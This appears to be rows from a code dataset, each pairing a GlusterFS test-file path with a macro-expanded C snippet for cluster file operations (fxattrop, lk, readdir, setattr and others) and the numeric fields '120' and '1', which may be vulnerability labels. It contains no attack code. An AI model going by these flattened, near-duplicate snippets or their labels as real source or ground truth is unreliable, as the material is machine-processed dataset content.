2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fxattrop_cbk) tmp_cbk = cluster_fxattrop_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fxattrop""; _new->unwind_to = ""cluster_fxattrop_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fxattrop_cbk = cluster_fxattrop_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fxattrop); subvols[__i]->fops->fxattrop (_new, subvols[__i], fd, flags, dict, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  gf_xattrop_flags_t flags, dict_t *dict, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fxattrop_cbk) tmp_cbk = cluster_fxattrop_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fxattrop""; _new->unwind_to = ""cluster_fxattrop_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fxattrop_cbk = cluster_fxattrop_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fxattrop); subvols[__i]->fops->fxattrop (_new, subvols[__i], fd, flags, dict, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                       ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->removexattr_cbk) tmp_cbk = cluster_removexattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->removexattr""; _new->unwind_to = ""cluster_removexattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->removexattr_cbk = cluster_removexattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->removexattr); subvols[__i]->fops->removexattr (_new, subvols[__i], loc, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                     const char *name, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->removexattr_cbk) tmp_cbk = cluster_removexattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->removexattr""; _new->unwind_to = ""cluster_removexattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->removexattr_cbk = cluster_removexattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->removexattr); subvols[__i]->fops->removexattr (_new, subvols[__i], loc, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                     ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fremovexattr_cbk) tmp_cbk = cluster_fremovexattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fremovexattr""; _new->unwind_to = ""cluster_fremovexattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fremovexattr_cbk = cluster_fremovexattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fremovexattr); subvols[__i]->fops->fremovexattr (_new, subvols[__i], fd, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                      const char *name, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->fremovexattr_cbk) tmp_cbk = cluster_fremovexattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->fremovexattr""; _new->unwind_to = ""cluster_fremovexattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->fremovexattr_cbk = cluster_fremovexattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->fremovexattr); subvols[__i]->fops->fremovexattr (_new, subvols[__i], fd, name, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                    ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->lk_cbk) tmp_cbk = cluster_lk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->lk""; _new->unwind_to = ""cluster_lk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->lk_cbk = cluster_lk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->lk); subvols[__i]->fops->lk (_new, subvols[__i], fd, cmd, lock, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"            int32_t cmd, struct gf_flock *lock, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->lk_cbk) tmp_cbk = cluster_lk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->lk""; _new->unwind_to = ""cluster_lk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->lk_cbk = cluster_lk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->lk); subvols[__i]->fops->lk (_new, subvols[__i], fd, cmd, lock, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->rchecksum_cbk) tmp_cbk = cluster_rchecksum_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->rchecksum""; _new->unwind_to = ""cluster_rchecksum_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->rchecksum_cbk = cluster_rchecksum_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->rchecksum); subvols[__i]->fops->rchecksum (_new, subvols[__i], fd, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                   int32_t len, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->rchecksum_cbk) tmp_cbk = cluster_rchecksum_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->rchecksum""; _new->unwind_to = ""cluster_rchecksum_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->rchecksum_cbk = cluster_rchecksum_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->rchecksum); subvols[__i]->fops->rchecksum (_new, subvols[__i], fd, offset, len, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                       ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readdir_cbk) tmp_cbk = cluster_readdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readdir""; _new->unwind_to = ""cluster_readdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readdir_cbk = cluster_readdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readdir); subvols[__i]->fops->readdir (_new, subvols[__i], fd, size, off, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 size_t size, off_t off, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readdir_cbk) tmp_cbk = cluster_readdir_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readdir""; _new->unwind_to = ""cluster_readdir_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readdir_cbk = cluster_readdir_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readdir); subvols[__i]->fops->readdir (_new, subvols[__i], fd, size, off, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                     ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readdirp_cbk) tmp_cbk = cluster_readdirp_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readdirp""; _new->unwind_to = ""cluster_readdirp_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readdirp_cbk = cluster_readdirp_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readdirp); subvols[__i]->fops->readdirp (_new, subvols[__i], fd, size, off, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                  size_t size, off_t off, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->readdirp_cbk) tmp_cbk = cluster_readdirp_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->readdirp""; _new->unwind_to = ""cluster_readdirp_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->readdirp_cbk = cluster_readdirp_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->readdirp); subvols[__i]->fops->readdirp (_new, subvols[__i], fd, size, off, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                     ;
        return fop_success_fill (replies, numsubvols, output);
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->setattr_cbk) tmp_cbk = cluster_setattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->setattr""; _new->unwind_to = ""cluster_setattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->setattr_cbk = cluster_setattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->setattr); subvols[__i]->fops->setattr (_new, subvols[__i], loc, stbuf, valid, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                 struct iatt *stbuf, int32_t valid, dict_t *xdata)
{
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->setattr_cbk) tmp_cbk = cluster_setattr_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->setattr""; _new->unwind_to = ""cluster_setattr_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->setattr_cbk = cluster_setattr_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->setattr); subvols[__i]->fops->setattr (_new, subvols[__i], loc, stbuf, valid, xdata); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                        ;
        return fop_success_fill (replies, numsubvols, output);
"
